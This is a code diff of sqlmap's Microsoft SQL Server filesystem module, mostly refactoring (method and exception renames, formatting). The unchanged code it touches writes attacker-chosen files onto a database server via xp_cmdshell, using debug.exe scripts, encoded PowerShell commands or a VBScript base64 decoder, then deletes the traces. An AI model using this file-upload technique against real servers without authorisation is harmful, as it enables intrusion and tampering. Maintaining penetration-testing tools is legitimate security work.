@@ -1,11 +1,10 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
-import codecs
 import ntpath
 import os
 
@@ -21,8 +20,8 @@ from lib.core.data import logger
 from lib.core.enums import CHARSET_TYPE
 from lib.core.enums import EXPECTED
 from lib.core.enums import PAYLOAD
-from lib.core.exception import sqlmapNoneDataException
-from lib.core.exception import sqlmapUnsupportedFeatureException
+from lib.core.exception import SqlmapNoneDataException
+from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.request import inject
 
 from plugins.generic.filesystem import Filesystem as GenericFilesystem
@@ -31,7 +30,7 @@ class Filesystem(GenericFilesystem):
     def __init__(self):
         GenericFilesystem.__init__(self)
 
-    def __dataToScr(self, fileContent, chunkName):
+    def _dataToScr(self, fileContent, chunkName):
         fileLines = []
         fileSize = len(fileContent)
         lineAddr = 0x100
@@ -45,7 +44,7 @@ class Filesystem(GenericFilesystem):
         for fileLine in xrange(0, len(fileContent), lineLen):
             scrString = ""
 
-            for lineChar in fileContent[fileLine:fileLine+lineLen]:
+            for lineChar in fileContent[fileLine:fileLine + lineLen]:
                 strLineChar = hexencode(lineChar)
 
                 if not scrString:
@@ -62,10 +61,10 @@ class Filesystem(GenericFilesystem):
 
         return fileLines
 
-    def __updateDestChunk(self, fileContent, tmpPath):
+    def _updateDestChunk(self, fileContent, tmpPath):
         randScr = "tmpf%s.scr" % randomStr(lowercase=True)
         chunkName = randomStr(lowercase=True)
-        fileScrLines = self.__dataToScr(fileContent, chunkName)
+        fileScrLines = self._dataToScr(fileContent, chunkName)
 
         logger.debug("uploading debug script to %s\%s, please wait.." % (tmpPath, randScr))
 
@@ -73,7 +72,7 @@ class Filesystem(GenericFilesystem):
 
         logger.debug("generating chunk file %s\%s from debug script %s" % (tmpPath, chunkName, randScr))
 
-        commands = ( "cd %s" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr )
+        commands = ("cd %s" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr)
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
@@ -138,7 +137,7 @@ class Filesystem(GenericFilesystem):
         inject.goStacked(binToHexQuery)
 
         if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
-            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, error=False)
+            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)
 
         if not result:
             result = []
@@ -147,7 +146,7 @@ class Filesystem(GenericFilesystem):
             if not isNumPosStrValue(count):
                 errMsg = "unable to retrieve the content of the "
                 errMsg += "file '%s'" % rFile
-                raise sqlmapNoneDataException(errMsg)
+                raise SqlmapNoneDataException(errMsg)
 
             indexRange = getLimitRange(count)
 
@@ -159,12 +158,12 @@ class Filesystem(GenericFilesystem):
 
         return result
 
-    def unionWriteFile(self, wFile, dFile, fileType):
+    def unionWriteFile(self, wFile, dFile, fileType, forceCheck=False):
         errMsg = "Microsoft SQL Server does not support file upload with "
         errMsg += "UNION query SQL injection technique"
-        raise sqlmapUnsupportedFeatureException(errMsg)
+        raise SqlmapUnsupportedFeatureException(errMsg)
 
-    def __stackedWriteFilePS(self, tmpPath, wFileContent, dFile, fileType):
+    def _stackedWriteFilePS(self, tmpPath, wFileContent, dFile, fileType):
         infoMsg = "using PowerShell to write the %s file content " % fileType
         infoMsg += "to file '%s', please wait.." % dFile
         logger.info(infoMsg)
@@ -184,14 +183,14 @@ class Filesystem(GenericFilesystem):
 
         logger.debug("converting the file utilizing PowerShell EncodedCommand")
 
-        commands = ( "cd %s" % tmpPath,
+        commands = ("cd %s" % tmpPath,
                      "powershell -EncodedCommand %s" % psString,
-                     "del /F /Q %s" % randFilePath )
+                     "del /F /Q %s" % randFilePath)
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
 
-    def __stackedWriteFileDebugExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
+    def _stackedWriteFileDebugExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
         infoMsg = "using debug.exe to write the %s " % fileType
         infoMsg += "file content to file '%s', please wait.." % dFile
         logger.info(infoMsg)
@@ -202,7 +201,7 @@ class Filesystem(GenericFilesystem):
         debugSize = 0xFF00
 
         if wFileSize < debugSize:
-            chunkName = self.__updateDestChunk(wFileContent, tmpPath)
+            chunkName = self._updateDestChunk(wFileContent, tmpPath)
 
             debugMsg = "renaming chunk file %s\%s to %s " % (tmpPath, chunkName, fileType)
             debugMsg += "file %s\%s and moving it to %s" % (tmpPath, dFileName, dFile)
@@ -222,7 +221,7 @@ class Filesystem(GenericFilesystem):
 
             for i in xrange(0, wFileSize, debugSize):
                 wFileChunk = wFileContent[i:i + debugSize]
-                chunkName = self.__updateDestChunk(wFileChunk, tmpPath)
+                chunkName = self._updateDestChunk(wFileChunk, tmpPath)
 
                 if i == 0:
                     debugMsg = "renaming chunk "
@@ -246,7 +245,7 @@ class Filesystem(GenericFilesystem):
 
             self.execCmd(complComm)
 
-    def __stackedWriteFileVbs(self, tmpPath, wFileContent, dFile, fileType):
+    def _stackedWriteFileVbs(self, tmpPath, wFileContent, dFile, fileType):
         infoMsg = "using a custom visual basic script to write the "
         infoMsg += "%s file content to file '%s', please wait.." % (fileType, dFile)
         logger.info(infoMsg)
@@ -262,22 +261,22 @@ class Filesystem(GenericFilesystem):
         Set file = fs.GetFile(inputFilePath)
         If file.Size Then
             Wscript.Echo "Loading from: " & inputFilePath
-            Wscript.Echo 
+            Wscript.Echo
             Set fd = fs.OpenTextFile(inputFilePath, 1)
             data = fd.ReadAll
             fd.Close
             data = Replace(data, " ", "")
             data = Replace(data, vbCr, "")
             data = Replace(data, vbLf, "")
-            Wscript.Echo "Fixed Input: " 
+            Wscript.Echo "Fixed Input: "
             Wscript.Echo data
-            Wscript.Echo 
+            Wscript.Echo
             decodedData = base64_decode(data)
-            Wscript.Echo "Output: " 
+            Wscript.Echo "Output: "
             Wscript.Echo decodedData
-            Wscript.Echo 
+            Wscript.Echo
             Wscript.Echo "Writing output in: " & outputFilePath
-            Wscript.Echo 
+            Wscript.Echo
             Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile(outputFilePath, 2, True)
             ofs.Write decodedData
             ofs.close
@@ -320,14 +319,14 @@ class Filesystem(GenericFilesystem):
 
         self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)
 
-        commands = ( "cd %s" % tmpPath, "cscript //nologo %s" % randVbs,
+        commands = ("cd %s" % tmpPath, "cscript //nologo %s" % randVbs,
                      "del /F /Q %s" % randVbs,
-                     "del /F /Q %s" % randFile )
+                     "del /F /Q %s" % randFile)
         complComm = " & ".join(command for command in commands)
 
         self.execCmd(complComm)
 
-    def stackedWriteFile(self, wFile, dFile, fileType):
+    def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
         # NOTE: this is needed here because we use xp_cmdshell extended
         # procedure to write a file on the back-end Microsoft SQL Server
         # file system
@@ -337,19 +336,20 @@ class Filesystem(GenericFilesystem):
 
         tmpPath = posixToNtSlashes(conf.tmpPath)
         dFile = posixToNtSlashes(dFile)
-        wFilePointer = codecs.open(wFile, "rb")
-        wFileContent = wFilePointer.read()
-        wFilePointer.close()
+        with open(wFile, "rb") as f:
+            wFileContent = f.read()
 
-        self.__stackedWriteFileVbs(tmpPath, wFileContent, dFile, fileType)
+        self._stackedWriteFileVbs(tmpPath, wFileContent, dFile, fileType)
+        written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
 
-        sameFile = self.askCheckWrittenFile(wFile, dFile, fileType)
-
-        if sameFile is False:
+        if written is False:
             message = "do you want to try to upload the file with "
             message += "another technique? [Y/n] "
             choice = readInput(message, default="Y")
 
             if not choice or choice.lower() == "y":
-                self.__stackedWriteFileDebugExe(tmpPath, wFile, wFileContent, dFile, fileType)
-                #self.__stackedWriteFilePS(tmpPath, wFileContent, dFile, fileType)
+                self._stackedWriteFileDebugExe(tmpPath, wFile, wFileContent, dFile, fileType)
+                #self._stackedWriteFilePS(tmpPath, wFileContent, dFile, fileType)
+                written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
+
+        return written
